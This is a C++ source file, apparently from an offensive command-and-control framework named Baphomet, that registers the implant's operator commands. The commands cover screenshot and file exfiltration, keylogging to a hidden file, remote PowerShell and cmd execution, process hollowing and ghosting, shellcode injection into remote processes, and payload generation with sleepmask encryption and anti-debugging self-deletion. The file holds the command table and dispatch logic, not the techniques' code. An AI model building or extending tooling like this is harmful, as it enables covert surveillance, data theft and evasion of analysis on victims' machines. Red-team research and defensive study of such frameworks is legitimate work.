//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>

namespace lurch {
    accepted_commands baphomet::commands;
    std::unordered_map<std::string, std::function<result<std::string>(baphomet*, reciever_context&)>> baphomet::callables;
}

void
lurch::baphomet::init_commands() {

    if(!commands.ready()) {

        //
        // init accepted commands
        //

        commands.add_command("pwd", "prints the working directory of the implant");
        commands.add_command("ls", "displays files in the working directory");
        commands.add_command("procenum", "enumerates all running processes on the victim machine");
        commands.add_command("screenshot", "takes a screenshot and exfiltrates it");
        commands.add_command("whoami", "gets whoami.exe info without starting a shell process");
        commands.add_command("get_task", "used by the agent to retrieve a task.");
        commands.add_command("tasks", "display all existing tasks.");
        commands.add_command("die", "tells the running agent to exit.");
        commands.add_command("staged", "display staged files that can be downloaded by the agent.");
        commands.add_command("clear_tasks", "clear all currently assigned tasks.");
        commands.add_command("indicate_exit", "Used by the agent to indicate that it is exiting.");
        commands.add_command("checkin", "Used by the agent to indicate it has connected.");
        commands.add_command("getinfo", "retrieves basic info about the victim machine.");
        commands.add_command("listener", "displays a listener for this object if one exists.");
        commands.add_command("stop_listener", "stops a listener for this object if one exists.");


        commands.add_command("help", "display this help message, or use --command to learn about something in specific.")
            .arg<std::string>("--command", "-c", false)
            .desc("If specified, shows information about a specific command.");


        commands.add_command("cd", "changes the working directory")
            .arg<std::string>("--directory", "-d", true)
            .desc("The directory Baphomet should change into. Can be relative or absolute.");


        commands.add_command("cat", "displays file contents")
            .arg<std::string>("--file-name", "-f", true)
            .desc("The name of the file to read. Do not use this on binary files.");


        commands.add_command("mkdir", "creates a directory")
            .arg<std::string>("--directory", "-d", true)
            .desc("The name of the directory to create.");


        commands.add_command("rm", "removes a directory or file")
            .arg<std::string>("--directory-entry", "-de", true)
            .desc("The name of the directory entry to delete.");


        commands.add_command("cp", "copies a file to a specified location")
            .arg<std::string>("--source", "-s", true)
            .desc("The source file to be copied.")
            .arg<std::string>("--destination", "-d", true)
            .desc("The path of the new file that will be created. The source is copied here.");


        commands.add_command("ps", "executes a powershell command and returns the output")
            .arg<std::string>("--command", "-c", true)
            .desc("The powershell command to be executed.");


        commands.add_command("cmd", "executes a shell command (cmd.exe) and returns the output")
            .arg<std::string>("--command", "-c", true)
            .desc("The shell command to be executed.");


        commands.add_command("exfil", "exfiltrates a file")
            .arg<std::string>("--directory-entry", "-de", true)
            .desc("The path to the file to be exfiltrated. Can be relative or absolute.");


        commands.add_command("keylog", "starts or stops keylogging. Only available with no sleepmask.")
            .arg<empty>("--start", "-st", false)
            .desc("Start a keylogging thread. The thread will save keystrokes into a hidden log file.")
            .arg<empty>("--stop", "-sp", false)
            .desc("Stop the keylogging thread. This will end keylogging and erase the log file.")
            .arg<empty>("--get", "-g", false)
            .desc("Retrieve the contents of the log file. This should be done BEFORE keylogging is stopped.");


        commands.add_command("runexe", "runs a staged executable file on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true)
            .desc("The name of a previously staged executable. This should be a 64 bit Windows PE file.")

            .arg<empty>("--hollow", "-h", false)
            .desc("If specified, the execution technique is Process Hollowing.<br>"
                  "The agent will pause until execution finishes, and the stdout of<br>"
                  "the executable is returned to the operator.")

            .arg<empty>("--ghost", "-g", false)
            .desc("If specified, the execution technique is Process Ghosting. The operation becomes asynchronous,<br>"
                  "and the stdout of the executable is NOT returned to the operator.");


        commands.add_command("rundll", "runs a staged DLL on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true)
            .desc("The previously staged DLL to be ran. Currently does not return the stdout of this DLL.");


        commands.add_command("runbof", "runs a staged Beacon Object File on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true)
            .desc("The previously staged BOF to be executed. Execution begins from the \"go\" function.")

            .arg<std::string>("--arguments", "-a", false)
            .desc("The arguments to be passed to the BOF. For details on how to format the arguments,<br>"
                      "please visit the bof-exec repository on my Github page.");


        commands.add_command("runshellcode", "loads shellcode into memory and executes it")
            .arg<std::string>("--staged-file", "-sf", true)
            .desc("The previously staged .bin file to be executed.")

            .arg<empty>("--child", "-c", false)
            .desc("If this argument is specified, the shellcode is executed in a child process.<br>"
                  "If the shellcode prints to stdout, the output is retrieved and sent back as the result.")

            .arg<empty>("--local", "-l", false)
            .desc("If this argument is specified, the shellcode is executed locally, in the host process.")

            .arg<int64_t>("--pid", "-p", false)
            .desc("If a PID is specified, the shellcode is injected into that remote process.");


        commands.add_command("complete_task", "used by the agent to complete a task.")
            .arg<std::string>("--result", "-r", true)
            .desc("The result of the command that was received and executed.");


        commands.add_command("start_listener", "start a listener on a specified address or port")
            .arg<std::string>("--type", "-t", true)
            .desc("The protocol of the listener. Currently supported options are http and https.")

            .arg<std::string>("--address", "-a", true)
            .desc("The IP address to bind the listener to.")

            .arg<int64_t>("--port", "-p", true)
            .desc("The port to bind the listener to.");


        commands.add_command("generate_payload", "generates a Baphomet payload in the specified format.")
            .arg<std::string>("--format", "-f", true)
            .desc("The format to build the payload in. Can either be \"exe\" or \"shellcode\".")

            .arg<empty>("--use-listener", "-l", false)
            .desc("If this is specified, the listener associated with this object is used.<br>"
                  "Otherwise, the agent connects to the IP address and port that the teamserver is currently running on.")

            .arg<std::string>("--user-agent", "-ua", false)
            .desc("If provided, this string will be used in the User/Agent field of the agent's request headers. (HTTP and HTTPS only).")

            .arg<int64_t>("--sleeptime", "-s", false)
            .desc("The time, in milliseconds, that the agent should sleep for. For example, 4 seconds would be 4000.<br>"
                  "The default sleep time is 2000ms. The sleep time cannot be lower than 1500ms.")

            .arg<int64_t>("--jitter", "-j", false)
            .desc("A value between 0 and 10 that specifies the jitter interval.<br>"
                  "The default value is 0 (no jitter).")

            .arg<int64_t>("--killdate", "-kd", false)
            .desc("The time, in hours, at which point the agent's token should be deleted.<br>"
                  "Once this happens and the agent tries to connect to the team server, it<br>"
                  "will be denied access, and as a result will exit/die.")

            .arg<empty>("--use-sleepmask", "-m", false)
            .desc("If specified, a sleepmask is used to encrypt the agent's memory while it sleeps.<br>"
                  "Note that this has no effect if the agent is being generated as an executable.")

            .arg<empty>("--prevent-debugging", "-pd", false)
            .desc("If specified, the agent will check to see if it is being debugged when it runs.<br>"
                  "When this happens, it will delete itself and exit to avoid further analysis.");

        commands.done();

        //
        // init callables
        //

        callables =
        {
            {"checkin",       &baphomet::checkin},
            {"start_listener",&baphomet::start_listener},
            {"stop_listener", &baphomet::stop_listener},
            {"indicate_exit", &baphomet::indicate_exit},
            {"generate_payload", &baphomet::generate_payload},
            {"cat",           &baphomet::cat},
            {"cd",            &baphomet::cd},
            {"mkdir",         &baphomet::mkdir},
            {"rm",            &baphomet::rm},
            {"cp",            &baphomet::cp},
            {"ps",            &baphomet::ps},
            {"cmd",           &baphomet::cmd},
            {"exfil",         &baphomet::exfil},
            {"keylog",        &baphomet::keylog},
            {"runbof",        &baphomet::runbof},
            {"runexe",        &baphomet::runexe},
            {"rundll",        &baphomet::rundll},
            {"runshellcode",  &baphomet::runshellcode},
            {"complete_task", &baphomet::complete_task},
            {"get_task",      &baphomet::get_task},
            {"tasks",         [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_tasks(); }},
            {"listener",      [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_listeners(); }},
            {"staged",        [](baphomet*  ptr, reciever_context& ctx) { return ptr->print_staged_files(); }},
            {"clear_tasks",   [](baphomet*  ptr, reciever_context& ctx) { return ptr->clear_tasks(); }},

            {"help",        [&](baphomet* ptr, reciever_context& ctx) {

                const auto [command] = ctx.cmd.get<std::string>("--command","-c").done();
                if(command) {
                    return commands.command_help(*command);
                }

                return commands.help();
            }}
        };
    }
}

